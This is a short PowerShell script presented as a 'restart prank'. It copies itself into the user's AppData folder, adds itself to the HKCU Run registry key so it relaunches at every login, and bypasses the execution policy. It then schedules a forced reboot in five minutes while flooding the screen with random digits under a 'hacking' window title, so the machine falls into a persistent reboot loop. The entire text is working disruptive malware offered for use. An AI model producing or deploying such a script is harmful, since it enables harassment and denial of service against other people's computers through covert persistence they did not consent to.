$path = "$env:APPDATA\RestartPrank.ps1"
$content = @"
`$currentFile = `"$path`"
`$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
New-ItemProperty -Path `$runKey -Name "MyScript" -PropertyType String -Value `$currentFile -Force
shutdown /r /t 300
while (`$true) {
    `$host.UI.RawUI.WindowTitle = "hacking"
    `$line = ""
    for (`$i = 0; `$i -lt 300; `$i++) {
        `$line += Get-Random -Maximum 10
    }
    Write-Host `$line -ForegroundColor Green
}
"@
Set-Content -Path $path -Value $content -Encoding UTF8
Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$path`""
